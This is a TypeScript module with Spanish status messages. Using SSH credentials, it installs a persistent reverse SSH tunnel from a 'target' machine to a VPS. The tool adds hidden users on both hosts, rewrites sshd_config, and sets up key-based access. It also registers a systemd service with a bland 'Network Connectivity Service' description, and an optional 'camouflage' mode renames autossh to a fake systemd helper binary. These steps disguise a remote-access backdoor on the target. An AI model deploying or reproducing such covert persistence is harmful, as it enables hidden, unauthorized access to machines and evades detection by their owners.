import { Client, ConnectConfig } from "ssh2";

export interface VpsCreds {
  host: string;
  port: number;
  user: string;
  password?: string;
  privateKey?: string;
}

export interface TargetCreds {
  host: string;
  port: number;
  user: string;
  password?: string;
  privateKey?: string;
}

export interface DeployConfig {
  target: TargetCreds;
  vps: VpsCreds;
  remotePort: number;
  localPort: number;
  serviceName: string;
  camouflage: boolean;
  ipQosBackground: boolean;
}

export interface DeployProgress {
  phase: string;
  message: string;
  error?: string;
  sshPublicKey?: string;
  done: boolean;
}

function sshConnect(config: ConnectConfig): Promise<Client> {
  return new Promise((resolve, reject) => {
    const client = new Client();
    client.on("ready", () => resolve(client));
    client.on("error", reject);
    client.connect(config);
  });
}

function sshExec(client: Client, command: string): Promise<{ stdout: string; stderr: string; code: number }> {
  return new Promise((resolve, reject) => {
    client.exec(command, (err, stream) => {
      if (err) return reject(err);
      let stdout = "";
      let stderr = "";
      stream.on("data", (d: Buffer) => { stdout += d.toString(); });
      stream.stderr.on("data", (d: Buffer) => { stderr += d.toString(); });
      stream.on("close", (code: number) => resolve({ stdout, stderr, code }));
      stream.on("error", reject);
    });
  });
}

function sshExecIgnoreCode(client: Client, command: string): Promise<{ stdout: string; stderr: string; code: number }> {
  return sshExec(client, command).catch(() => ({ stdout: "", stderr: "", code: 0 }));
}

export async function deployReverseTunnel(
  config: DeployConfig,
  onProgress: (p: DeployProgress) => void
): Promise<DeployProgress> {
  let vpsClient: Client | null = null;
  let targetClient: Client | null = null;

  try {
    // ─────────────────────────────────────────────────
    // Phase 1: Prepare VPS
    // ─────────────────────────────────────────────────
    onProgress({ phase: "vps-connect", message: "Conectando al VPS...", done: false });

    const vpsConfig: ConnectConfig = {
      host: config.vps.host,
      port: config.vps.port,
      username: config.vps.user,
      password: config.vps.password,
      privateKey: config.vps.privateKey,
      readyTimeout: 15000,
      keepaliveInterval: 10000,
      keepaliveCountMax: 3,
    };
    vpsClient = await sshConnect(vpsConfig);

    onProgress({ phase: "vps-prepare", message: "Creando tunneluser en VPS...", done: false });

    await sshExecIgnoreCode(vpsClient, "sudo useradd -r -s /usr/sbin/nologin tunneluser 2>/dev/null");
    await sshExec(vpsClient, "sudo mkdir -p ~tunneluser/.ssh");
    await sshExec(vpsClient, "sudo chmod 700 ~tunneluser/.ssh");
    await sshExec(vpsClient, "sudo touch ~tunneluser/.ssh/authorized_keys");
    await sshExec(vpsClient, "sudo chmod 600 ~tunneluser/.ssh/authorized_keys");
    await sshExec(vpsClient, "sudo chown -R tunneluser:tunneluser ~tunneluser/.ssh");

    // Configure sshd
    const sshdMatchBlock = `Match User tunneluser
  PermitTTY no
  ForceCommand /usr/sbin/nologin
  X11Forwarding no
  AllowTcpForwarding yes
  PermitListen 127.0.0.1:${config.remotePort}
  GatewayPorts no
  PermitOpen any`;

    const { stdout: sshdCheck } = await sshExecIgnoreCode(vpsClient, "grep 'Match User tunneluser' /etc/ssh/sshd_config");
    if (!sshdCheck.includes("tunneluser")) {
      const { stdout: matchLines } = await sshExecIgnoreCode(vpsClient, "grep -n '^Match ' /etc/ssh/sshd_config | head -1 | cut -d: -f1");
      const matchLine = matchLines.trim();
      if (matchLine) {
        await sshExec(vpsClient, `sudo sed -i '${matchLine}i${sshdMatchBlock.replace(/\n/g, "\\n")}' /etc/ssh/sshd_config`);
      } else {
        const escapedBlock = sshdMatchBlock.replace(/'/g, "'\\''");
        await sshExec(vpsClient, `echo '${escapedBlock}' | sudo tee -a /etc/ssh/sshd_config > /dev/null`);
      }
    }

    await sshExecIgnoreCode(vpsClient, "sudo systemctl reload sshd 2>/dev/null || sudo service ssh reload 2>/dev/null");

    onProgress({ phase: "vps-ready", message: "VPS preparado. Conectando al target...", done: false });

    // ─────────────────────────────────────────────────
    // Phase 2: Prepare Target
    // ─────────────────────────────────────────────────
    const targetConfig: ConnectConfig = {
      host: config.target.host,
      port: config.target.port,
      username: config.target.user,
      password: config.target.password,
      privateKey: config.target.privateKey,
      readyTimeout: 15000,
      keepaliveInterval: 10000,
      keepaliveCountMax: 3,
    };
    targetClient = await sshConnect(targetConfig);

    onProgress({ phase: "target-prepare", message: "Instalando autossh en target...", done: false });

    await sshExecIgnoreCode(targetClient, "apt-get update -qq 2>/dev/null");
    const { code: autosshCheck } = await sshExecIgnoreCode(targetClient, "which autossh");
    if (autosshCheck !== 0) {
      await sshExec(targetClient, "DEBIAN_FRONTEND=noninteractive apt-get install -y -qq autossh 2>/dev/null");
    }

    await sshExecIgnoreCode(targetClient, "sudo useradd -r -m -s /bin/bash tunneluser 2>/dev/null");
    await sshExec(targetClient, "sudo mkdir -p ~tunneluser/.ssh");
    await sshExec(targetClient, "sudo chmod 700 ~tunneluser/.ssh");

    const { stdout: keyExists } = await sshExecIgnoreCode(targetClient, "sudo test -f ~tunneluser/.ssh/id_ed25519 && echo yes || echo no");
    if (keyExists.trim() !== "yes") {
      await sshExec(targetClient, "sudo -u tunneluser ssh-keygen -t ed25519 -f ~tunneluser/.ssh/id_ed25519 -N '' -q");
    }
    const { stdout: pubKeyRaw } = await sshExec(targetClient, "sudo cat ~tunneluser/.ssh/id_ed25519.pub");
    const pubKey = pubKeyRaw.trim();

    await sshExec(targetClient, "sudo chown -R tunneluser:tunneluser ~tunneluser/.ssh");
    await sshExec(targetClient, "sudo chmod 600 ~tunneluser/.ssh/id_ed25519");
    await sshExec(targetClient, "sudo chmod 644 ~tunneluser/.ssh/id_ed25519.pub");

    onProgress({ phase: "key-exchange", message: "Intercambiando clave pública con VPS...", done: false });

    const { stdout: keyAlreadyThere } = await sshExecIgnoreCode(vpsClient, `sudo grep '${pubKey.substring(0, 50)}' ~tunneluser/.ssh/authorized_keys`);
    if (!keyAlreadyThere.includes("ssh-ed25519")) {
      const escapedKey = pubKey.replace(/'/g, "'\\''");
      await sshExec(vpsClient, `echo '${escapedKey}' | sudo tee -a ~tunneluser/.ssh/authorized_keys > /dev/null`);
    }

    const { stdout: verifyKey } = await sshExec(vpsClient, "sudo cat ~tunneluser/.ssh/authorized_keys | grep -c 'ssh-ed25519'");
    if (parseInt(verifyKey.trim()) === 0) {
      throw new Error("Failed to add public key to VPS authorized_keys");
    }

    onProgress({ phase: "service-install", message: "Creando servicio systemd...", done: false });

    const autosshBin = config.camouflage ? "/usr/lib/systemd/systemd-network-helper" : "/usr/bin/autossh";
    const sshOpts = "-o StrictHostKeyChecking=no -o ServerAliveInterval=30 -o ServerAliveCountMax=3 -o ExitOnForwardFailure=yes";
    const remoteForward = `-R 127.0.0.1:${config.remotePort}:127.0.0.1:${config.localPort}`;
    const execStart = `${autosshBin} ${sshOpts} ${remoteForward} -i ~tunneluser/.ssh/id_ed25519 -N tunneluser@${config.vps.host} -p ${config.vps.port}`;

    if (config.camouflage) {
      await sshExecIgnoreCode(targetClient, "sudo mkdir -p /usr/lib/systemd/");
      await sshExecIgnoreCode(targetClient, "sudo ln -sf /usr/bin/autossh /usr/lib/systemd/systemd-network-helper 2>/dev/null");
    }

    const ipQos = config.ipQosBackground ? "\nIPQoS=background" : "";

    const serviceContent = `[Unit]
Description=Network Connectivity Service
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
User=tunneluser
ExecStart=${execStart}
Restart=always
RestartSec=10
StartLimitInterval=0
Nice=19
IOSchedulingClass=idle${ipQos}

[Install]
WantedBy=multi-user.target`;

    const servicePath = `/etc/systemd/system/${config.serviceName}.service`;
    await sshExec(targetClient, `sudo tee '${servicePath}' > /dev/null << 'SERVICEEOF'\n${serviceContent}\nSERVICEEOF`);
    await sshExec(targetClient, "sudo systemctl daemon-reload");
    await sshExec(targetClient, `sudo systemctl enable ${config.serviceName}`);
    await sshExec(targetClient, `sudo systemctl restart ${config.serviceName}`);

    onProgress({ phase: "verify", message: "Verificando túnel...", done: false });

    await new Promise((r) => setTimeout(r, 3000));

    const { stdout: portCheck } = await sshExecIgnoreCode(vpsClient, `ss -tlnp | grep -q ':${config.remotePort}' && echo LISTENING || echo NOT_LISTENING`);
    const isListening = portCheck.trim() === "LISTENING";

    let ncCheck = "";
    if (!isListening) {
      const { stdout: ncResult } = await sshExecIgnoreCode(vpsClient, `nc -z -w3 127.0.0.1 ${config.remotePort} 2>&1 && echo OK || echo FAIL`);
      ncCheck = ncResult.trim();
    }

    const tunnelUp = isListening || ncCheck === "OK";

    if (!tunnelUp) {
      const { stdout: serviceStatus } = await sshExecIgnoreCode(targetClient, `sudo systemctl status ${config.serviceName} 2>&1 | head -20`);
      const { stdout: journalLog } = await sshExecIgnoreCode(targetClient, `sudo journalctl -u ${config.serviceName} --no-pager -n 20 2>&1`);
      return {
        phase: "complete-warning",
        message: `Deploy completado pero el túnel no responde. Logs:\n${serviceStatus}\n${journalLog}`,
        sshPublicKey: pubKey,
        done: true,
      };
    }

    onProgress({
      phase: "complete",
      message: `Deploy completado. Túnel activo: ${config.vps.host}:${config.remotePort} -> target:${config.localPort}`,
      sshPublicKey: pubKey,
      done: true,
    });

    return {
      phase: "complete",
      message: "Deploy exitoso. El túnel reverse está activo.",
      sshPublicKey: pubKey,
      done: true,
    };
  } catch (err: any) {
    const errorMsg = err.message || "Error desconocido durante el deploy";
    onProgress({ phase: "error", message: errorMsg, error: errorMsg, done: true });
    return { phase: "error", message: errorMsg, error: errorMsg, done: true };
  } finally {
    if (targetClient) { try { targetClient.end(); } catch {} }
    if (vpsClient) { try { vpsClient.end(); } catch {} }
  }
}